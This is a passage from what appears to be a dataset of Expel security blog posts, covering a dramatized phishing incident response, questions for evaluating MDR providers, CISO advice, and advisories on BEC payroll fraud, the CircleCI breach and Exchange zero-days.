this case. The root cause of most attacks? Phishing emails. MDR and phishing services together make up the Expel SOC, and they communicate extensively, maximizing effective response across our customer base. Since Jose and other phishing analysts are at the front edge of so many attacks, they can alert MDR analysts sooner about potential business email compromise (BEC). Attacker trends are commonly noted by phishing analysts, who pass the information on to their MDR counterparts. Overall, having both services in place means fuller coverage and quicker response. Back to the story. Thankfully this customer, Vandelay Industries, provides the Expel SOC with Live Response access via their EDR console, meaning Jose can directly acquire the file for fuller analysis. Detonating the document in our sandbox confirms that the document isnt, in fact, the Tax Planning Help Guide its name suggests (we know  were as shocked as you are). Hey, Jenni, says Jose, this sandbox execution looks bad. Jenni looks at the endpoint timeline (since the malicious document was first opened). Im guessing that JPEG isnt really a JPEG, she mumbles, as she runs the hash through VirusTotal. Remediation: incident to fix Im gonna spin this up into an incident, Jenni says. They need to isolate that host. For many incidents, automation baked into our process lets Jenni instantly both notify the customer about what were seeing and suggest remediation steps. More hosts, hashes, and domains will be added to the list of suggested remediation steps as the SOC gathers indicators of compromise (IOCs). Dear Vandelay Industries, Today At 5:47 UTC Windows Defender detected Regsvr32.exe being spawned from `Winword.exe on host DESKTOP-3AB921 and making network connections to BadDomain.com Contain the host DESKTOP-3AB921 Block the malicious Word document Tax Planning Help Guide.docx with SHA256 hash ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad Sinkhole the domain BadDomain.com Block emails from BadEmails.com with subject line Download the Tax Planning Help Guide We will update you if we identify any other involved hosts. Within 20 seconds of the incidents creation, our customer has meaningful action they can use to nip the attack in the bud. And yes, were tooting our own horn here. Were good at what we do and we do it quickly. Which customer was that incident for again, Jenni? asks Deshawn. I see two more alerts in the medium queue that look similar. Vandelay Industries. Jenni replies. Is that the DESKTOP-3AB921 host youre seeing, or a new one? Same customer, but new hosts both of them. Ill drop those in the incident and assign those remediations to Vandelay, DeShawn adds. Thanks, she says, Im gonna make this incident critical and update the customer in Slack. Would you mind scoping those hosts for anything newdomains or otherwise? Whoa. Vandelay already yanked that first host off the network. That was quick! At this point, much of the heavy lifting is done. Jenni and another member of the Global Response Team (GRT) will continue to deep dive into anything thats still not fully understood. Theyll ask questions like: How many users received the email and how many clicked on the malicious attachment? Whats the source of the email? How many hosts are involved? What network activity did we see? Was there any evidence of persistence or lateral movement? Did the malicious files successfully execute? Should the hosts be reimaged? New IOCs are added as they are discovered and any new alerts that come through are attached to the Incident. The GRT is composed of senior and principal-level analysts who serve as incident responders for critical incidents. These are our most seasoned analysts and they help validate all aspects of the compromise. Next question: How can we help the client avoid this next time? Resilience: prevention The team shared remediation steps with Vandelay and Jenni awaits confirmation. David has joined the Zoom call as a member of the GRT to help Jenni finalize things. Jenni tells David that, So far, were seeing execution on three hosts from what appears to be click-through by users into a phishing campaign. That led to a malicious Word file. Ive updated the customer but am still waiting for them to respond. Two of the hosts are still online. The incident is critical because of the multiple hosts, so they should have received a notification by now, but still no word. Ill ping their account rep and have them reach out by phone. David thinks out loud. So they dont have auto-containment in Workbench enabled, Let me get into the console and poke around. Elapsed time since we first issued customer recommendations: 40 minutes. This situation is tricky, as were dealing with multiple hosts and decreased weekend staffing by the customer. What can we do when theres an active threat but the customer is out-of-pocket? Good news: clients can opt into our automated remediation service, which can automatically contain hosts as needed. Unfortunately, Vandelay isnt taking advantage of this feature. I think weve added all the relevant artifacts to the remediation actions, David explains. Im checking to see if we can suggest anything thats helpful for the future. Looks like theyve been recommended previously to turn-off allowing wscript.exe to open shell scripts. Im seeing that recommendation nine, ten11 times total, over the past year. Ill add it to the Resilience section again. This particular customer had a total of 20 endpoint-related security incidents within its environment last year, more than half of which would have been avoided with the proper wscript.exe resilience policy in place. While resilience steps are not always easy to implement, they can make a substantive, positive impact on a customers security posture. Expel SOC analysts are up early anyway and available 24/7, but most people dont want to be awakened on a Sunday morning by a critical incident. Your weekend on-call folks, not to mention your CISO, will thank you for preventing incidents like this. PagerDuty automation, enabling auto-containment and completing resilience recommendations are small investments that can be made to improve response times for future incidents. PagerDuty can wake you up if something goes wrong. Auto-contain authorization lets us isolate compromised hosts even if you dont wake up. Completed resilience action can help you avoid these issues altogether. Lets say you want to take a deeper look into your environment. Are my remediation steps working as expected? What else is Regsvr32.exe doing on our endpoints? Do we have any coverage gaps? Threat hunting: validation and high-level understanding [The next day; the familiar &lt;ding-dong&gt; sound chimes as Bryan joins the Zoom call] Hey gang, is Jenni on? She asked me to pop insomething about a wscript.exe hunt? Bryan knows both the red and blue side of cyber and now gets to employ those years of experience in a threat hunting capacity. Our hunting service, a big step beyond detection and response, lets us dig deep into customer data to find not only detection gaps and suspicious events, but also to verify resilience. Our hunting catalog easily expands to scope for both confirmation of resilience and absence of emergent IOCs. We ask questions like: Was multi-factor authentication (MFA) really enabled for all users? Is the Server Message Block (SMB) protocol accessible on public facing servers? What Amazon Web Services (AWS) region should we not see in this environment? Does Java.exe ever have any suspicious child processes? These questions are crucial. If you think youre hardening your infrastructure, dont you want to be sure? Hey Bryan, Im here, Jenni chimes in. Vandelay had a thing yesterday where wscript.exe was involved. I wanted to see if we can do some hunting on how commonly that process is used in their environment. Also, Id love to be able to verify that shell scripts no longer get opened with wscript? Weve recommended that resilience action to them a bunch of times. It really helps if theyre able to get a better picture across their systems. Is that something we can do? A lot of in-house security teams are so busy they rarely have time to baseline or research their own environments. Questions like, What parent process typically spawns wscript.exe? can slip down the priority list. And Which users and domains are most commonly seen executing Okta impersonation events? Or What AWS users do we see commonly using long term AccesskeyIDs? Expel threat hunting can provide some much needed insight into these and other endpoint, SaaS, and cloud questions. Hey Jenni, glad to jump on. Have they ever confirmed implementation of that resilience step? Bryan asks. I wonder if its something theyve simply chosen not to do. Jenni says, I saw back in October they marked that action as complete. Im wondering if they pushed the policy but didnt quite get the protection theyd intended. Were still seeing it run, obviously. Do we have a hunt we could employ to scope wscript activity across all their hosts? The Historical Scripting Interpreter hunt would shed some light on that for them, suggests Bryan. Theyre using Windows Defender right? Ill ping their account rep to see if they want to get the process going. Thanks for bringing this up.Yeah they are using Defender, she replies, and thanks for doing that. Let me know if you need anything from this end. Thanks Jenni, Ill keep you posted on how it progresses. Might have you run the analysis when the hunt kicks off. Great catch on the incident, by the way. The Expel threat hunting service iterates around a historical POV and a broader range of detection complexity. We conduct regular monthly hunts on your tech and infrastructure, and we run periodic IOC hunts as new threats emerge. Even more fun: with Expel, you can even take advantage of evolving draft hunts for testing and development. We afford our hunting customers better visibility across their whole landscape. Whether its cloud infra, SaaS applications, network, or endpoint-related hunts, our coverage includes a wide array of technologies. For example: AWS EC2 modifications hunt Duos Suspicious Duo Push activity hunt Cloud apps data center logins hunt Cloud infras Azure Successful Brute Force hunt Azure Successful Bruteforce hunt We also provide additional insights and resilience recommendations to help reduce risk exposure in the future. Threat hunting allows you to validate that youre as secure as youre trying to be, and provides a path forward on things that still need some attention. What else can hunting do? And, where do we go from here? Completing the circle: better detection Were definitely seeing it come through the queue, says Bryan, but I want us to elevate its severity to high. Weve seen this technique spike this month in particular. The Vandelay incident really highlighted the recent uptick in this usage of a JPEG file as an obfuscated script file. OSINT calls it a Shorse Attack. I dont know where they get these names So basically, Peter replies, if the command line contains wscript plus.jpg or .jpeg we categorize it as a HIGH. Right? Peter, an Expel senior detection and response analyst, joins Bryan to make sure the activity gets categorized appropriately. If the detection logic produces higher-fidelity signal, we want to elevate the severity to get analysts attention more quickly. Exactly, Bryan says. We ended up running that query across another five or six customers and found that its a lot more prevalent than the months prior. This adjustment should surface these alerts to an analyst even quicker. Peter nods. Sounds good. That change should be live within the hour. Ill holler if I have any more questions. Thanks, Peter. Ill check back in a few days. This Shorse stuff makes me wonder if this might be a good long-term hunt for our catalog. Basically, wscript.exe being run containing any atypical file types in the command line. Ill let you know what I find. Whether it comes out of our threat hunting experience, a phishing campaign, or new threat intel, Expel constantly adjusts the dials on our detection capabilities. We try to harness every ounce of analyst attention and brain power toward customer alerts, and we never want to waste a scrap of what we learn. Completing the feedback loop is critical to properly facing a rapidly evolving threat landscape. Tomorrow, even if attackers start using electric toothbrushes to launch attacks, well be able to respond. What end-to-end coverage means to us We dramatized the Vandelay incident for readability, but we see events like this all the time at Expel. Like, every single week. And each time we work through the alert  investigation  phishing  incident  hunting  better detection  alert cycle (and its various permutations), we get faster and better, to make you safer. Jenni, Girish, Tucker, Jose, Chris, DeShawn, David, Bryan, and Peter are just a few members of the team keeping eyes-on-glass all-day-every-day. This is 360 security at its best. Youre invited to test drive our comprehensive MDR, phishing and hunting services to experience the full benefits.'}) (input_keys={'title'}),
  Example({'title': 'Does your MSSP or MDR provider know how to manage ...', 'url': 'https://expel.com/blog/does-your-mssp-or-mdr-provider-know-how-to-manage-your-signals/', 'date': 'Apr 11, 2019', 'contents': 'Subscribe  EXPEL BLOG Does your MSSP or MDR provider know how to manage your signals? Security operations  4 MIN READ  JAMES JURAN  APR 11, 2019  TAGS: How to / Managed security / Selecting tech / Tools Weve said it before but its worth repeating  when youre evaluating an MSSP or MDR, youve gotta make sure the provider can integrate with the tech you already have and make it work harder for you. (Pro tip: If your MSSP or MDR immediately suggests that you run out and buy a chest of shiny new security tools, theyre probably not the right fit for you .) Here are four questions to ask your prospective provider to find out if theyre up to the challenge of managing your fleet of security signals. Question 1: How do you get data from my existing tech? Most security devices or services stream data via syslog or WebSocket. At first glance, this seems like a great way to collect all those disparate security signals  especially because your provider doesnt have to write extra code. Before you hit the easy button, dig a little deeper with your provider. Ask some questions like: How hard is it for me as a customer to set that up? How will I know that its working or when it breaks (like when my network admin accidentally removes the firewall rule that allowed my data to get to your collector)? What happens when your collector is down? Will the one high-priority alert that indicates attackers are in my network get dropped on the floor and delay discovery of the intrusion? Can I ask the device or service for more information to support an investigation, or can I only receive the information that you chose to put in the streaming protocol? Instead of streaming data, we prefer to poll for alerts. Yes, it takes more work, but its much more reliable and it lets us audit our data ingestion processes to make sure were not missing anything mission critical (BTW, weve got a whole post on setting up a rockin data auditing process ). Here are a few reasons why we think polling for data is more effective and reliable: When theres an interruption for any reason, you and your provider know what data was received and what wasnt, so you can pick up where you left off. And if something goes wrong (it happens once in a while) your provider can easily set the clock back and re-ingest data. You can conduct an audit to double check that you and your provider received the alerts they were supposed to receive. (Were big fans of checking our work!) Its super easy for you as the customer to set this up with your provider. For most devices or services, all you have to do is create an API key with the right permissions and the provider handles the rest. There are some security product and service vendors that have more sophisticated protocols than raw syslog and WebSockets that provide these same benefits  your vendor should gladly support those too. Question 2: What tools do you use to make sure my signals are getting to you? With lots of security signals coming in from different directions, youve gotta make sure your provider can verify that theyre receiving the signals from all your tech. In our case, we combine tools like Datadog , PagerDuty , Sentry , Googles Stackdriver Trace , and Slack to keep a close watch on whats going on with every device and let the right people know when theres a problem. Ask your provider what tools they use to monitor device health, how quickly theyll detect if something isnt working and how theyll communicate that to you. Take it one step further and find a way to check your providers work. One of our guiding principles here is, Show me metrics or it didnt happen. Intuition and anecdotes are useful but they dont prove what happened or form the basis for monitoring. For each of our customers, we have an automatically-generated Datadog dashboard for each customers security devices. This gives us an easy, comprehensive way to look at a devices performance over time: And because troubleshooting a problem shouldnt require logging into a production database, we built a Slack bot that quickly gives our device integration engineers the lowdown on whats happening with each device and makes it easy for them to pivot to other systems for deeper investigation: Ask your provider how they check device health and request a first-hand look at the tools they use to make sure theyre receiving all your signals (then, see if they have a solid process in place in case something goes wrong). Question 3: How do you build integrations with new devices? When your service provider builds an integration with a new security product, do they reinvent the wheel every time (and find new ways to make mistakes)? Or do they have a process to build each integration faster and better than the last one? TL;DR: Your provider needs a framework that handles all the complexities of receiving signal. That framework should handle all the complexities of alert polling, populating metrics and handling errors. This lets the integration developer focus on actions that are specific to the new security product. Question 4: What happens when things break? The old adage is true  nobody is perfect all the time. But does your provider tell you about problems as theyre happening  on a public status page for systemic problems or with a personal phone call, email or Slack message when the issue is specific to your tech? And once the problem is fixed, whats the provider doing to reduce the risk of that same issue happening again? Even with the best reviews, testing and monitoring, problems still happen. When they do, a good provider will  fix the problem two ways . Solving the immediate problem as quickly as possible to mitigate the impact is the obvious part. The part that takes discipline is coming back and figuring out how to reduce the risk of the problem from ever occurring again, how to catch it sooner when it does and identifying easier ways to diagnose and fix it. How can you get a better understanding of how your provider will act when things dont go as planned? Ask to see their latest after-action report on something that failed. Or, ask to talk to one of their customers who experienced a problem with the service and then ask that customer how the provider handled it. Diving deeper Want more ideas on what to ask your potential provider? We could give you a whole laundry list of Qs to ask when evaluating an MSSP or MDR (this is one of our favorite topics, in case you couldnt tell). In fact, weve got more of those questions  lots of em  here on our blog. Check out  12 revealing questions to ask when evaluating an MSSP or MDR provider  and  12 ways to tell if your managed security provider wont suck next year .'}) (input_keys={'title'}),
  Example({'title': "Don't blow it - 5 ways to make the most of the chance to ...", 'url': 'https://expel.com/blog/5-ways-to-make-the-most-of-chance-to-revamp-security-posture/', 'date': 'May 28, 2019', 'contents': 'Subscribe  EXPEL BLOG Dont blow it  5 ways to make the most of the chance to revamp your security posture Security operations  4 MIN READ  MICHAEL SUTTON  MAY 28, 2019  TAGS: CISO / Managed security / Management / Planning Michael Sutton is the founder of StoneMill Ventures, which invests in disruptive cybersecurity companies. Michael has more than 20 years experience working in the security space, spending nearly 11 years as the Chief Information Security Officer (CISO) at Zscaler, and holding security-focused roles at companies like Hewlett-Packard, Verisign and Ernst &amp; Young. I occasionally hear from CISOs that a moment in time comes when they suddenly have a blank slate and therefore the opportunity to fundamentally revamp their security posture. This blank slate appears for a variety of reasons: maybe the CISO is new to the company, a breach occurred, the companys taking on new investment capital, or the companys preparing to go public. Whatever the driver, this is a golden opportunity for a CISO  one that shouldnt be squandered. In fact, I found myself in this situation a few years ago. Heres what I learned about making the most of this opportunity, along with some guidance as to where to start when you have an empty canvas in front of you. Build a foundation Even though youve probably got plenty of opinions on whats needed to build (or rebuild) a great security program  and its great that the company is now interested in investing in security  avoid the temptation to dive in head first and start making changes immediately. All good things do come to an end, which is why its critical that you first establish a game plan that youll continually reference as the basis for any decisions you make going forward. No matter how much flexibility you may have at a given point in time, youll always have someone to answer to and youll need to show progress against committed milestones. So where do you start? To set yourself and the company up for long-term success, select and build your program around an established cybersecurity framework. Doing so will keep you on track, assist with prioritization and provide a clear roadmap that others can easily follow so they know where youre headed. There are plenty of cybersecurity frameworks available and you should take some time to identify the one thatll work best for you. In my experience, the NIST Cybersecurity Framework is now the most widely adopted among U.S. enterprises and is flexible enough to meet the needs of most orgs. Whatever framework you choose, its important to first map your existing security controls against the framework. Youll be able to show everyone where deficiencies exist and help with prioritizing resources. This mapping will serve as a baseline that you can measure yourself against  its a great way to show progress as you make security investments. Seek objective opinions As much as we want to think we have all the answers, seeking external and objective viewpoints will help validate your assessments. Consider external pen tests or risk assessments, which you can usually get at a relatively low cost if you negotiate small initial contracts with larger ones to follow once your overall plan is approved. Its much easier to defend your assessment of the orgs security posture or to seek additional budget if you can point to empirical evidence where weak controls already exposed your org to risk. Make friends Security is a team sport. Even if youve secured budget for new resources, collaborating with other teams is essential. For example, selecting a source code scanning tool wont be valuable if the developers dont want to use it, or if you selected one that doesnt fit into their existing workflow. And good luck navigating any security audit without the cooperation of other departments. Thats why youve got to build those alliances early and often. Make sure that others in the org view the security team as one that can help them achieve their objectives, not hold them back. Having allies is critical to your success. Position security as a business driver Too many executives view the security team as a cost center and, even worse, the part of the company that slows them down. While you shouldnt expect to ever be seen as a profit center, you should absolutely position security as a business driver. How exactly can you do that? Work with other teams to understand their needs (when in doubt, re-read the Make friends section above) and determine how security can help. For example, has your sales team run into roadblocks with certain deals because of regulatory and compliance issues? Thats an area where you can and should lend a hand. Or have you heard employees complaining about not being able to use a certain tool or service because theyre blocked by security and IT? Dont ever lower your security posture to appease your colleagues, but in my experience theres usually a way to meet employees needs without negatively impacting your risk profile if you take the time to understand what theyre trying to achieve. All you need to do is sit down with them and take the time to listen. Ask for regular feedback Security is never done. Thats why its critical to revisit your initial mapping and make sure the gaps you identified at the beginning of the process are closing and that investments are paying off. Over time, youll probably need to create additional metrics to show your progress. These metrics will differ depending on your goals, but itll help you communicate to and get support from your executive team and the board. Every enterprise has a moment of clarity when it comes to security. Whether that arrives via the installation of a new security-conscious CEO or from landing on the front page of The New York Times thanks to a high-profile breach, make sure youve got a game plan for moving forward. Step up to the plate, follow these tips, and youll be sure to knock it out of the park.'}) (input_keys={'title'}),
  Example({'title': "Don't dam upstream: ways to build a feedback loop", 'url': 'https://expel.com/blog/dont-dam-upstream-ways-build-feedback-loop/', 'date': 'Sep 14, 2017', 'contents': 'Subscribe  EXPEL BLOG Dont dam upstream: ways to build a feedback loop Talent  2 MIN READ  YANEK KORFF  SEP 14, 2017  TAGS: Employee retention / Great place to work / Management I was interviewing a candidate for a security analyst role and asked one of my two favorite questions: Talk to me about a time or a project where, looking back on it you think to yourself: if I never have to do that again, itll be too soon. What was that misery, and what made it miserable? The candidate had a strong technical background and his experience was right on the mark. He also had an exceptionally relevant response. He described working at a federal SOC. Overall, it was a great learning experience, he said. They were constantly finding bad stuff and he learned a lot from his peers, but neither he nor his co-workers had any ability to influence detection. A separate team handled that. And  for security reasons  neither team could talk to the other. Hah! So, every week hed see the same false positives hed flagged the week before and the week before that. Over time, this bred a feeling of helplessness, boredom and eventually burnout. His story reminded me of an article Id read in the Harvard Business Review years ago by the CEO of Johnsonville Sausage. He was struggling with performance problems and described his employees as so bored by their jobs that they made thoughtless, dumb mistakes. They showed up in the morning, halfheartedly did what they were told, and then went home. Sounds terrible (side note: the thought of quality problems in sausage makes me a bit queasy).In any case, it took years, but that CEO finally came to an important realization: Those who implement a decision and live with its consequences are the best people to make it. The result? They changed their quality control system. Turns out, this practice applies directly to security operations and probably a lot of other disciplines as well. The people who live with the consequences of detection must be integral to deciding how intelligence and methodologies are applied in the first place. Without this feedback loop, youre stuck with bad sausage. Back to the interview. We were hiring for a role where the candidate would be in the exact same position hed just said he never wanted to repeat. At the time, the feedback loop in our SOC was broken and the required fixes werent trivial. Even though he was an exceptionally well qualified candidate, we chose not to proceed because hed have been miserable.These disconnects arent unusual. Just add a feedback loop is too simplistic an answer. Solving this problem in security operations is much harder. Many analysts in a SOC lack the experience to effectively drive detection. Those who do have the experience typically dont work in the SOC (or at least, not on shift) and may have forgotten exactly how frustrating this situation can be. Still, its not hopeless. If you find yourself in this situation, here are four options to build in a feedback loop. 1. Align incentives If the SOC and detection/intel team report into different managers, make it clear to your detection teams manager that her success is measured by the SOC managers enthusiastic support. 2. Get physical Is your SOC sectioned off from the rest of your security team? Reserve seats for your sister teams personnel. If there arent enough seats, rotate people through. 3. Make the pain transparent By measuring the time wasted chasing dead ends (or even the volume of dead ends) and tying those to root causes, youll make it clear when adjustments are needed upstream. 4. Celebrate improvement As you use metrics to drive change in your detection methodologies, reward your teams when the needle meaningfully moves in the right direction. Common wins help unify teams.  This is the second part of a five part series on key areas of focus to improve security team retention. Read the introduction, 5 ways to keep your security nerds happy , or continue to part three .'}) (input_keys={'title'}),
  Example({'title': 'Election security: Why to care and what to do about it', 'url': 'https://expel.com/blog/election-security-why-care-what-to-do/', 'date': 'Apr 7, 2020', 'contents': 'Subscribe  EXPEL BLOG Election security: Why to care and what to do about it Security operations  3 MIN READ  BRUCE POTTER  APR 7, 2020  TAGS: Framework / Guide / NIST / Planning If someone asked you to think about elections, whats the first thing that comes to mind? For most people, its that moment when you show up at your polling place and cast your ballot. But the reality is that the system is so much larger than that  elections are about far more than the voting machine and election security is about more than securing a single piece of equipment. Consider voter registration efforts and election rolls, all of the information voters have digested leading up to voting day that have influenced their decisions  And dont forget what happens after you cast your vote and how the results are tallied. Now combine all those moments in the election security supply chain with a global health crisis  think sending absentee ballots to everyone in a given state so they can vote in the primary  and youve got even more potential election-related vulnerabilities on your hands. To understand and mitigate election security, its essential to consider the entire supply chain. The parts of our election security supply chain There are six distinct parts of the election supply chain (see below) and they all have the potential to be compromised at different times (and in different ways) during the election cycle. The TL;DR? The potential for election compromise starts long before Election Day. Which is exactly why we created a handbook about the election security supply chain. We know there are other election security guides out there  but most of them focus only on a single part of the election process, like voting infrastructure. In our latest guide , we zoom in on each step along the election supply chain and look at potential points of compromise including how a crafty attacker could hack each piece along the chain. For each part of the election supply chain we also offer up ideas about how public and private sector organizationseven individual, well-informed citizens who are planning to votecan better protect our elections from attacks. Why it matters Whether you work in security, are an election official or just happened to be, well, an informed voter, there are plenty of ways we can all band together to collectively improve the security posture of our elections systems. And no matter your role in the process, maintaining or improving the integrity of our democracy is in everybodys best interest. What we (yes, you) can do about it By focusing on even a few key proactive security measures, our election security supply chain would be far better protected than it is today. Here are just a few ideas on how we can work together to improve election security: Educate yourself (and others). Whether youre making sure your election officials know how to transfer election results to a website (ahem, Iowa) or sending your security analysts to relevant training sessions or conferences, educating the people who impact each part of the election supply chain is paramount. And if youre a regular ol voter? Fact check what you read about candidates and issues, and get your information from multiple, varied sources. Learn about (and implement) security best practices and frameworks. If youve worked in security for any length of time, chances are good that youve heard of the NIST Cyber Security Framework (CSF) . The NIST CSF is one of the many frameworks out there that can help you gauge your effectiveness when it comes to security and think about how you want your efforts to change or grow. So whether its NIST or something else, pick a framework and use it to understand where and how you can get better. Pressure test your systems. You know what helps when bad things start happening? Having a plan and knowing who needs to do what when something goes sideways. Create an incident response plan better yet, create a plan, emulate an incident and practice what you might do if that bad thing happened in real life. Grab your copy of our election security handbook Want to read more? Click the button below to download your copy of our election security handbook right now. Download the election security handbook'}) (input_keys={'title'}),
  Example({'title': 'Emerging Threat: BEC Payroll Fraud Advisory', 'url': 'https://expel.com/blog/emerging-threat-bec-payroll-fraud-advisory/', 'date': 'Jul 27, 2022', 'contents': 'Subscribe  EXPEL BLOG Emerging Threat: BEC Payroll Fraud Advisory Security operations  2 MIN READ  JONATHAN HENCINSKI, JENNIFER MAYNARD, RAY PUGH, KYLE PELLETT, ANDREW BENTLE, DAVID BLANTON, DESHAWN LUU AND BEN BRIGIDA  JUL 27, 2022  TAGS: MDR In July 2022, our security operations center (SOC) observed Business Email Compromise (BEC) attacks across multiple customer environments, targeting access to human capital management systemsspecifically, Workday. The goal of these attacks? Payroll and direct deposit fraud. In this post, well share the attack chain weve seen across multiple environments and high-level tips for spotting this class of fraud. How they get in An attacker begins by compromising a users Microsoft Office 365 (O365) or Okta account, often using BasicAuthentication (BAV2ROPC, IMAP, POP3) to bypass multi-factor authentication (MFA)usually occurring from VPN and hosting IPs. From there, attackers can access the victims Workday account directly through Okta, the compromised password, or a password reset email. In scenarios where the attacker compromises an O365 account and doesnt have direct access to Workday via single sign on (SSO), an attacker will read available documentation on payroll systems and new employee payroll enrollment. The goal, in most cases, is to identify how to gain access to human capital management systems using new employee setup procedures, or password reset requests. (Side note: weve also seen cases where attackers dont use BasicAuthentication, and the compromised user authorizes an MFA notification for the attacker using brute force Duo push requests. This involves an attacker continuously sending Duo push notifications to the victim until they accept.) Attackers can then create inbox rules within the compromised users email account to delete or move emails related to workday.com, myworkday.com, and/or emails with keywords (like payroll or assistance needed). To prolong this access, attackers can enroll trusted devices through an organizations mobile or endpoint device management platform (for example, Microsoft InTune). Now, the attacker can modify the compromised users settings to add the attackers direct deposit informationdepositing the victims paycheck into the attackers account. How to spot it So what can you do to detectand hopefully preventthese costly attacks? Heres what we recommend: For security teams: Alert for new Outlook Inbox-rules created with suspicious names (two to three characters in length, or repeating characters could be a clue). Also watch out for certain keywords, like payroll and Workday Alert for multiple Okta sessions from the same user with multiple, non-mobile operating systems Alert for potential brute force Duo push requests Review any authentication using legacy protocol (UA = Bav2ropc) into O365 as it may represent MFA bypass. (P.S. Have you disabled legacy protocols yet?) For employees (if you notice your paychecks arent correct): First, log into your payroll platform and check your paycheck. Check that the amounts are correct and are distributed to your legitimate bank accounts. Check the rules for your Outlook Inbox for any abnormal or suspicious rules you didnt set up. Click File and then Rules &amp; Alerts to review the rules youve implemented. If anything is incorrect, alert your security team immediately . If you get locked out of your account for an unknown reason, check your deposit information immediately when you regain access. For businesses, the impact of this likely varies based on size. A large business may have more of a safety net when it comes to resources to compensate employees that have been compromised. A smaller operation might suffer more if it boils down to lack of fundsnot to mention, the loss of the employee who was victimized in the first place. Our most recent quarterly threat report revealed 57% of all incidents our SOC observed were BEC attempts in O365with 24% of our customers experiencing at least one BEC attempt in O365. Were sharing this information to raise awareness on this class of fraud, help defenders spot it in the wild, and as a reminder that effective security operations is so much more than just protecting the endpoint.'}) (input_keys={'title'}),
  Example({'title': 'Emerging Threat: CircleCI Security Incident', 'url': 'https://expel.com/blog/emerging-threat-circleci-security-incident/', 'date': 'Jan 5, 2023', 'contents': 'Subscribe  EXPEL BLOG Emerging Threat: CircleCI Security Incident Security operations  3 MIN READ  JAMES JURAN AND SAM BROWN  JAN 5, 2023  TAGS: MDR What happened? Expel is aware of CircleCIs reported security incident and their recommendation to rotate all credentials stored in their system. Expel uses CircleCI, so were closely monitoring this situation for updates and were taking action ourselves. Why does it matter? CircleCI is a CI/CD (continuous integration and continuous delivery) platform used by more than a million engineers, Expel included. CI/CD systems often contain many powerful credentials, as they are a key part of the pipeline to ship software. At this time, there is no evidence that any of Expels credentials have been improperly used. But, based on CircleCIs announcement, were acting out of an abundance of caution. Whatre we doing? The good news: we anticipated these risks and tabletopped this situation starting all the way back in 2018. As a result of our tabletop exercises and risk analyses, we already have automated daily rotation in place for our highest-risk credentials. This means that if those credentials were exfiltrated, attackers would only have 24 hours to use them before they became useless. Additionally, Expel has detection systems within our environment to trigger on use of exposed credentials. In response to this specific incident, weve inventoried all credentials stored in CircleCI. Were rotating them as quickly as possible, and are reviewing logs of the use of those credentials for anomalous activity. What should you do right now? First: figure out if you use CircleCI in your organization. If you already work closely with your engineering team(s), you probably already know what they use for CI/CD. But, if software development is distributed throughout your organization and you dont have perfect visibility into their tooling, it may take some investigation. Pro tip: If you have a friend on your finance team, ask them if they pay a vendor named CircleCI or Circle Internet Servicesthat might be faster than tracking down a bunch of engineering teams. If you know you use CircleCI, its time to take action right away. First, eliminate the potential risk in your environment by rotating every credential stored in CircleCI. CircleCI has provided guidance about all the places secrets can be stored in CircleCI. For each one, go to the source of the credential, and rotate it. Exactly how you do this will depend on what it is. For example, if its a user account in a ticketing system, change the password for that user account. If its an API key or SSH key, disable or delete it, and make a new one. Replace the old credential in CircleCI with the new one. If you have a lot of credentials, this will take a while. Youll probably want to compile a list and split it up among multiple people. You may want to get buy-in from engineering leadership to have engineers help with this, and accept the fact this might cause some interruptions in your engineering teams work. We think thats a good tradeoff to make to protect your organizations security in this situation, based on the information available from CircleCI at this time. Once youve rotated all your credentials, youve achieved the first goal: eliminating the risk to your environment if your credentials were exposed. But, you also want to know if your credentials were actually used improperly. This is going to require reviewing the logs of usage of all those credentials. This is probably going to be time-consuming. You might even discover some gaps in your auditing; make notes of these to consider improving in the future. At the end of this exercise, youll know where you stand. Hopefully you can breathe a sigh of relief that you dodged a bullet. If you uncover suspicious activity, thats your cue to begin your incident response process. What can you do longer term? CI/CD systems are a big target for attackers, because they have a lot of powerful credentials. If you want to reduce your risk from this sort of threat, two things weve done that we recommend you consider doing are: Implement short-lived credential access and rotation workflow. We use Hashicorp Vault for this. See our blog post on using Hashicorp Vault to manage database credentials for more awesome things you can do with Hashicorp Vault to reduce your risk from long-lived credentials. Get a canary tool and use it. Create some credentials that arent actually used for anything and put them in any place (like your CI/CD tool) that stores credentials. Dont make it obvious that they are canary credentials, of course! Your canary tool will monitor if they are used and alert you. What next? Like we said, were monitoring this situation closely. Keep an eye out here and on our socials ( @ExpelSecurity ) for any additional recommendations as we learn more.'}) (input_keys={'title'}),
  Example({'title': 'Emerging Threats: Microsoft Exchange On-Prem Zero-Days', 'url': 'https://expel.com/blog/emerging-threats-microsoft-exchange-on-prem-zero-days/', 'date': 'Sep 30, 2022', 'contents': 'Subscribe  EXPEL BLOG Emerging Threats: Microsoft Exchange On-Prem Zero-Days Security operations  2 MIN READ  JONATHAN HENCINSKI  SEP 30, 2022  TAGS: MDR This week, Microsoft confirmed two new Exchange zero-day vulnerabilities used in attacks . Right now, there isnt a patch available for the two unique CVEs affecting Microsoft Exchange On-Premises (note that Microsoft Exchange Online customers arent impacted): CVE-2022-41040: Server-side Request Forgery (SSRF) vulnerability. This is when an attacker tricks the server into performing actions on their behalf. CVE-2022-41082: Allows remote code execution (RCE) when PowerShell is accessible to the attacker. This can be used to gain access to the server running Microsoft Exchange. What happened? GTSC , a Vietnamese Cybersecurity coalition, reported on September 29, 2022 that it had identified the exploitation of two previously undisclosed vulnerabilities on a fully patched Exchange Server. First observed in early August of this year, the vulnerabilities were originally reported to Microsoft and the Zero Day Initiative (ZDI) that same month. However, a patch hasnt yet been released. Microsoft did acknowledge the vulnerabilities today, September 30, 2022, and assigned them CVE designations. According to Microsoft, the observed vulnerabilities have been used together in attacks against Exchange Servers, with the successful exploitation of the SSRF vulnerability allowing for the possibility of the RCE vulnerability. Both vulnerabilities require authenticated access to the target Exchange Server. What should you do? While waiting for Microsoft to issue a patch, security teams can take a few actions to mitigate risk for their organizations. We recommend: First, for any on-prem customers, teams should immediately take the steps outlined by Microsoft to block exposed Remote PowerShell ports. Next, review your Exchange configuration to determine if Outlook Web App (OWA) is exposed to the internet. If the answer is yes, then determine if its necessary for any current business needs and evaluate the risk accordingly. (Pro tip: services like Shodan and Censys can help determine what services are publicly accessible.) If youve had a Hybrid deployment as part of migration efforts, consider performing an additional asset inventory check to ensure on-prem Exchange servers were taken offline post-migration as appropriate. Finally, continue to monitor for additional updates from Microsoft for any new mitigation measures as the situation develops. At Expel, were also reviewing all alerts for the past 30 days for known indicators of compromise (IOCs), reviewing alert activity for organizations running on-prem Microsoft Exchange Server, and validating detections for potential web shell delivery and activity. What does it mean for next time? When responding to zero-days, keep in mind that its not necessarily about the patchbecause 